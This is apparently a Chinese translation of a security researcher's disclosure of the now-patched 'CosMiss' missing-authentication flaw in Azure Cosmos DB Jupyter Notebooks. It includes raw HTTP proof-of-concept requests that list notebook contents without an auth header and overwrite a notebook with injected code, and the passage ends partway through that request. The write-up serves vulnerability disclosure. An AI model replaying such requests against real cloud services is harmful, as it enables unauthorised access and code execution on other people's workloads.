---
title: Azure Cosmos DB Notebook 远程代码执行漏洞
url: https://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497225&idx=1&sn=0d968065dbf9532f264e69571bb9faf8&chksm=eaa97e29dddef73fefa216287db7c08532b8879eab76641d0afba705ae00cf0d858cadf21174&scene=58&subscene=0#rd
source: 火线Zone
date: 2022-11-10
fetch_date: 2025-10-03T22:15:37.801253
---

# Azure Cosmos DB Notebook 远程代码执行漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMEdAQt23TuDlxOL1AAoWIn5qOm4d476mkLbagkh6UFB8Zo8Y5wVLlrg/0?wx_fmt=jpeg)

# Azure Cosmos DB Notebook 远程代码执行漏洞

M1n0s

火线Zone

*我们最近在 Azure Cosmos DB 上发现了一个非常重要的漏洞，其中 Cosmos DB Notebooks 中缺少身份验证检查。我们将其命名为“CosMiss”。简而言之，如果攻击者知道 Notebook 的“forwardingId”，即 Notebook Workspace 的 UUID，他们将拥有 Notebook 的完整权限，包括读写访问权限，以及修改该 Notebook 文件系统的能力。运行notebook的容器。通过修改容器文件系统（也称为临时notebook托管的专用工作区），我们能够在Notebook容器中获得远程代码执行（RCE）。*

*发现漏洞后，Orca Research Pod立即将其报告给 Microsoft 安全响应中心 (MSRC)，后者在两天内修复了该重要问题，这比我们在 Azure Synapse 中发现的SynLapse漏洞令人印象深刻且响应速度更快。我们验证了修复并可以确认现在所有 Cosmos DB Notebook 用户都需要在请求标头中提供授权令牌，然后才能访问 Notebook。我们要感谢 Microsoft 的合作以及他们为保护此漏洞而采取的快速行动。*

关于Cos Miss漏洞

* 该漏洞是在 Azure Cosmos DB Jupyter Notebooks 中发现的，这是 Microsoft 的快速 NoSQL 数据库，广泛用于 Microsoft 自己的电子商务平台和零售行业，用于存储目录数据和订单处理管道中的事件源。
* Jupyter Notebooks 内置在 Azure Cosmos DB 中，供开发人员用于执行常见任务，例如数据清理、数据探索、数据转换和机器学习。在我们的研究中，我们发现Cosmos DB Jupyter Notebooks 中缺少身份验证检查。
* 这是特别危险的，因为开发人员使用 Cosmos DB Notebooks 来创建代码，并且通常包含高度敏感的信息，例如嵌入在代码中的秘密和私钥。
* “CosMiss”漏洞允许未经身份验证的用户获得对 Azure Cosmos DB Notebooks 的读写访问权限、注入代码和覆盖代码——构成远程代码执行 (RCE)。
* 但是，只有知道Notebook工作区的 UUID（也称为\*\*forwardingId\*\*）的攻击者才能利用该漏洞。据我们所知，获取 forwardingId 的唯一方法就是以经过身份验证的用户身份打开 Notebook。虽然 forwardingId 没有被记录为秘密，所以我们没有任何理由相信用户会这样对待它。
* 2022年10 月 3 日， Orca Security 向 Microsoft 报告了该漏洞，后者在两天内修复并修补了该漏洞——现在每个notebook会话的请求标头中都需要一个授权令牌。

什么是Cosmos DB Notebooks？

CosMiss 漏洞是在 Cosmos DB Jupyter Notebooks 中发现的。Azure Cosmos DB 是一个快速的 NoSQL 数据库。Azure Cosmos DB 包括Jupyter Notebooks，它是一个开源交互式开发环境 (IDE)，允许开发人员创建、执行和共享包含实时代码、方程式、可视化和叙述性文本的文档。由于开发人员使用 Cosmos DB Notebooks 来创建代码，它们可以包含高度敏感的信息，例如嵌入在代码中的秘密和私钥。

利用Cos Miss的概念证明

为了演示该漏洞，我们使用 Azure 表 API 和无服务器容量模式创建了一个 Cosmos DB。该漏洞还在 Core SQL api（推荐）和预置吞吐量部署上得到验证。

Cosmos DB 数据资源管理器刀片中的notebook功能允许客户使用 Jupyter 功能（在 Python、C# 或其他运行时）访问和可视化他们的数据。此外，客户使用此功能来检查来自 Cosmos DB 的数据以及可以使用其 API 集成的其他数据源。

### 1.不需要授权头

*当用户创建一个新的 Notebook 时， phoenixServiceUrl*会创建以下端点，它会生成以下项目：

```
POST
/api/controlplane/toolscontainer/cosmosaccounts/subscriptions/[tenant-id]/resourceGroups/Orca-Research/providers/Microsoft.DocumentDB/databaseAccounts/orca-cosmos-dev/containerconnections/multicontainer HTTP/2
Host: tools.cosmos.azure.com
Content-Length: 88
Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
Authorization: Bearer
eyJ0eXAiOiJKV1QiLdaaaxxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQddaaam5ldC8yMjdkY2ExZC1iMWE1LTQ0MDEtYTVmZi05N2Q5OTMxZWE4YmUvIiwiaWF0IjoxNjY0NzE4NTI3LCJuYmYiOjE2NjQ3MTg1MjcsImV4cCI6MTY2NDcyMzIxOSwiYWNyIjoiMSIsndkbkZ3d1lKQUNNNjJjdmkrbERTVnRpQWIvdEpDOW9HV2VFd2pwWGhsL2x3aStzVzZWWHB5UmV5ZFpwMVgiLCJhdI0N2QtOTc0ZTUzY2JkZjNjIiwiYXBwaWRhY3Icadasdddddab3NtbyIsIm9pZCI6IjNhMzJkNmU1LWEyYzMtNGM5MS1iOTA5LTc0N2YxNjQ2NDg3MSIsInB1aWQiOiIxMDAzMjAwMjM2RUJBODZEIiwicmgiOiIwLkFZSUFIY3A5SXFXeEFVU2xfNWZaa3g2b3ZrWklmM2tBdXRkUHVrUGF3ZmoyTUJPQ0FHay4iLCJzY3AiOiJ1c2VyX2ltcGVyc29uYXRpb24iLCJzdWIiOiJZTElsRzB1anZDaktlSWo5OHozRk94R3ZvTjl2Umx3UFRtczlOa1dfQng0IiwidGlkIjoiMjI3ZGNhMWQtYjFhNS00NDAxLWE1ZmYtOTdkOTkzMWVhOGJlIiwidW5pcXVlX25hbWUiOiJjb3Ntb0BvcmNhc2VjdXJpdHlyZXNlYXJjaC5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJjb3Ntb0BvcmNhc2VjdXJpdHlyZXNlYXJjaC5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJuZ3VDVm1qZFhrS3RUSW5BaG9GbEFBIiwidmVyIjoiMS4wIiwieG1zX3RjZHQiOjE2MTg4MTYwODl9.Gyd3LXwzBG1yj-JfO0PCXOyD0exC7U-MCXwJBdsadcadad3xLIRZ7NqBq5BhE0WXLV2cgziYf-CAT9QT6oy1yIn58RaRdMojlVbhCpxlfFTdnsOXiorzNwTHzcwwvWsM4fbl2vV-RKMO
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: /
Origin: https://cosmos.azure.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://cosmos.azure.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-IL,en;q=0.9,he-IL;q=0.8,he;q=0.7,en-US;q=0.6,pl;q=0.5

{"cosmosEndpoint":"https://orca-cosmos-dev.documents.azure.com:443/","poolId":"default"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMX9JicxzNiasISfo0B4icOf8ybEorwyCngoDJhJES6YN43FMVl6o6GvUFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMVWyI8icqaiarEJlQW4klECgVMnunCsclu0EJZPrXplP0oYWATyHLLaQg/640?wx_fmt=png)

回应是：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMv38wJ61POmO0ylqxIoyJ7ebqp534fLcjtXGV5OpLz1YXcQ9DnktkZA/640?wx_fmt=png)

我们可以看到创建了以下项目：

1. https://seasia.tools.cosmos.azure.com端点。
2. 一个唯一的端口（端口范围从 10000-10009，稍后会详细介绍）。
3. 充当session/notebook ID的唯一值 ( **UUIDv4 )，也称为\****forwardingId\*\*（上例中为*ab83e033-1670-4bac-a186-32a1c0dddfbc\*）。

我们可以在后端看到服务器正在发送的以下端点：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMuAjU2Aic4ZQplLp2ckAn5lz9WaPc1FCqLw5RM19FfpyJ1zHPkRicsPMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSM8q5hPFiaeTC8LSDSOrLNbvRu19r6WIBVkDESlCbTqXicibLnicMGtEhZwA/640?wx_fmt=png)

我们当前的 forwardingId 似乎是**27f180bc-cf93-4c42-b23e-f27a5085da57**

```
<https://seasia.tools.cosmos.azure.com:10007/api/containergateway/27f180bc-cf93-4c42-b23e-f27a5085da57/api/contents/>
```

通过查看我们的notebook服务器（即https://seasia.tools.cosmos.azure.com:10007/）发送的各种请求，似乎所有发送到服务器的请求都包含一个**授权** **标头**，因为我们从下面的截图可以看出：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMHEXoNsNXpnZ2SCEI1HwmEqkgDia6E3PqbYLj4EJuwMrjlHt6uTgtr3Q/640?wx_fmt=png)

当我们尝试删除 Authorization Header 并发送相同的请求时，我们看到**No Authorization Header 需要列出同一服务器的不同 Notebook。**

```
https://seasia.tools.cosmos.azure.com:10007/api/containergateway/27f180bc-cf93-4c42-b23e-f27a5085da57/api/contents/notebooks
```

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMickggBicVIAzlvH3S8xF6bheW6uic08zsQNB0lysd3cuQSNibxh0tFDUiaA/640?wx_fmt=png)

由于 Cosmos DB 表和 Python 查询是基于 Jupyter（+Tornado 服务器）的，我们可以查看作为平台一部分的各种端点：

```
<https://github.com/jupyter-server/kernel_gateway/blob/master/kernel_gateway/jupyter_websocket/swagger.json>](<https://github.com/jupyter-server/kernel_gateway/blob/master/kernel_gateway/ jupyter_websocket/swagger.json>)#36
```

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMID7WtQ8kyOmJOudicX1ZTt32PGw80R0gFddwjxB7iaibWR8iapYl1a8reQ/640?wx_fmt=png)

在查看各种安全定义时，我们可以假设当前的安全配置默认设置不正确，**因为授权方法需要使用授权标头或查询字符串进行设置。**

考虑到这一点，我们现在可以尝试滥用这种错误配置来操纵各种notebooks和templates。

### 2. 覆盖、删除和注入代码

现在让我们尝试覆盖当前的 Notebook 数据。首先，我们在 notebook 中编写一些示例代码。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMNyOtGMjUWLfY0Ioy1icngzrVibCXrKTVUD4nZwxjePIYHnibSSUT4iaKPg/640?wx_fmt=png)

然后我们保存它——

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSM7tyibqlIg9xVYIYFcgcUiavpFBaCgahgt0svzaT1kAibsNHtxrP5O9GVA/640?wx_fmt=png)

我们还可以通过 Burp查看 Notebook ( **Untitled.ipynb ) –**

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMfBBtFLicwTHbsqhzFZHNRkIMTuBov0t2fO5GWNNEnaabALKtPvnsQzg/640?wx_fmt=png)

此外，我们可以从以下端点获取 kernel\_id：

```
<https://seasia.tools.cosmos.azure.com:10002/api/containergateway/ab83e033-1670-4bac-a186-32a1c0dddfbc/api/kernels/>
```

发送上述请求将为我们提供以下 id -

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaS7VibDljooxwsxbWWsffDSMUcD0FovahLZ8MacK62SfjutkOwVfefFEa3mQPXEsmagicQlMEz0lIqQ/640?wx_fmt=png)

现在让我们通过使用以下 JSON 有效负载向 Notebook 本身发送 PUT 请求来覆盖随机 Notebook（请参阅正文）：

* source参数⇒ *“print('Hacked')”*
* Text参数⇒ *“print('Hacked')”*

```
PUT
/api/containergateway/27f180bc-cf93-4c42-b23e-f27a5085da57/api/contents/notebooks/Untitled.ipynb HTTP/2
Host: [seasia.tools.cosmos.azure.com:1000](<http://seasia.tools.cosmos.azure.com:10005/>)7
Content-Length: 983
Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Origin: [<https://cosmos.azure.com>](<https://cosmos.azure.com/>)
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: c...